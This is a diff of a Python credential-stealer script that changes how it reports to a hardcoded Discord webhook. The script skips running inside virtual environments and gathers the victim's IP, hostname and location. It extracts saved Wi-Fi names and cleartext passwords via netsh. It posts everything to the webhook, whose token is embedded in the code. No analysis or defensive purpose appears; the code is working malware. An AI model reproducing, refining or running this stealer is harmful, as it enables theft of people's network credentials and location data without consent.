@@ -6,10 +6,8 @@ def invenv():
 if invenv() == True: sys.exit()
 import re, subprocess, requests,os
 import getpass;user=getpass.getuser()
-from discord import SyncWebhook
 hook = "https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv4n5SqN5kFabj3pC1MHdfu6jLaOddhdr4QX-zotnPNZMxo5AeM"
 class Network:
-
     def __init__(self):
         self.WiFi()
 
@@ -27,8 +25,7 @@ class Network:
 
     def WiFi(self):
         self.IP()
-        webhook1 = SyncWebhook.from_url(url=hook)
-        webhook1.send(f"IP : {self.ip}\nHostname: {self.hostname}\nCity: {self.city}\nRegion: {self.region}\nCountry: {self.country}\nLocation: {self.location}\nISP: {self.ISP}")
+        requests.post(hook,json={"content": f"IP : {self.ip}\nHostname: {self.hostname}\nCity: {self.city}\nRegion: {self.region}\nCountry: {self.country}\nLocation: {self.location}\nISP: {self.ISP}"})
         try:
             networks = re.findall(r"(?:Profile\s*:\s)(.*)", subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace"))
             for nets in networks:
@@ -36,8 +33,7 @@ class Network:
                 res = subprocess.check_output(f"netsh wlan show profile {nets} key=clear",shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace")
                 ssid = res.split("Type")[1].split(":")[1].split("\n")[0].split("\r")[0]
                 key = res.split("Key Content")[1].split(":")[1].split("\n")[0].split("\r")[0]
-                webhook = SyncWebhook.from_url(url=hook)
-                webhook.send(f"Wifi Network Found : ``{nets}`` \nSSID: ``{ssid}``\nPassword: ``{key}``")
+                requests.post(hook,json={"content": f"Wifi Network Found : ``{nets}`` \nSSID: ``{ssid}``\nPassword: ``{key}``"})
         except:pass
 
 c = Network()
